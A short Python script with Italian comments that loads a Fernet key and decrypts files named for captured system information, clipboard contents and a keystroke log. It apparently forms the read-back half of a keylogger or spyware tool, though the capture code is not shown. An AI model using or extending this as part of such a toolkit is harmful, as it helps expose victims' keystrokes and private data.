from cryptography.fernet import Fernet

# Caricamento della chiave segreta da un file esterno
def load_key():
    with open("secret.key", "rb") as key_file:
        return key_file.read()

# Decrittografia dei file
def decrypt_file(file_path):
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()
    decrypted_data = fernet.decrypt(encrypted_data)
    with open("decrypted_" + file_path, 'wb') as decrypted_file:
        decrypted_file.write(decrypted_data)

if __name__ == "__main__":
    # Carica la chiave
    KEY = load_key()
    fernet = Fernet(KEY)

    # Decrittografiamo i file crittografati
    decrypt_file("encrypted_system_info.txt")
    decrypt_file("encrypted_clipboard.txt")
    decrypt_file("encrypted_key_log.txt")